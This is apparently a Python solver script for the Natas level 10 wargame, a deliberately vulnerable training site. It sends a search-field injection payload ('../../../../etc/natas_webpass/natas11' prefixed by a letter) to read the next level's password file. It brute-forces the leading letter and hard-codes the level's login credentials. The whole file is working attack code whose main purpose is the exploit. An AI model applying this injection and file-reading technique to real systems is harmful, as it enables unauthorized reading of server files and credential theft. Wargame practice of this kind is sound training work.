#!/bin/python3

import argparse
import pyfiglet
import requests
import string
import sys

successes = list()

script_name = pyfiglet.figlet_format('Natas10 LFI')
print(script_name)

parser = argparse.ArgumentParser(add_help=True, description = 'Attempts to exploit LFI on the target URL')
parser.add_argument('-v','--verbose', action='store', help='Verbose mode')
parser.add_argument('-u','--url', action='store', help='URL to target', required=True)
parser.add_argument('-p', '--payload', action='store', help='LFI payload e.g. ../../../../etc/natas_webpass', required=True)
parser.add_argument('-c', '--cookies', action='store', help='For setting cookies if necessary e.g. {\'security\':\'low\', \'PHPSESSID\':\'<value>\'}')
args = parser.parse_args()

try:	
	print('[*] Testing URL...')
	payload = {'needle':f'{args.payload}', 'submit': 'Search'} 
	r = requests.post(f'{args.url}', data=payload , auth=('natas10', 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'))
	print(r.text)
	print('[+] Contents of URL...')
	contingency = input('Is the password for natas 11 in response? y or n ')
	if contingency == 'y':
		print('Well done!')
		print(f'Exiting {sys.argv[0]}')
		sys.exit(1)
	elif contingency == 'n':
		invoke = input('Attempt a Brute force attack for the solution? y or n ')
		if invoke == 'y':
			for letter in string.ascii_lowercase:				
					payload = {'needle':f'{letter} ../../../../etc/natas_webpass/natas11', 'submit': 'Search'} 
					r = requests.post(f'{args.url}', data=payload , auth=('natas10', 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'))
					if 'natas_webpass/natas11' in r.text:
						print(f'Success for letter {letter}')
						successes.append(letter)				
					else:
						print(f'[*] Trying {letter}') 		
			
			print(f'Successful letters: {successes}')
			decision = input('Any of the list above should retrieve the answer, please input a letter: ')
			if decision in successes:
				payload = {'needle':f'{decision} ../../../../etc/natas_webpass/natas11', 'submit': 'Search'} 
				r = requests.post(f'{args.url}', data=payload , auth=('natas10', 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'))
				print(r.text)
			else:
				print(f'Valid inputs include: {successes}')
				print(f'Exiting {sys.argv[0]}')
				sys.exit(1)	
			
			
		elif invoke == 'n':
			print(f'Exiting {sys.argv[0]}')
			sys.exit(1)
		else:
			print('Please supply y or n.')
			print(f'Exiting {sys.argv[0]}')
			sys.exit(1)	
	else:
		print('Please supply y or n.')
		print(f'Exiting {sys.argv[0]}')
		sys.exit(1)
		
except KeyboardInterrupt:
		print(f'Exiting {sys.argv[0]}')
		sys.exit(1)
			
except requests.exceptions.RequestException as er:
	print(f'Response returned: {er}')
	print(f'Exiting {sys.argv[0]}')
	sys.exit(1)
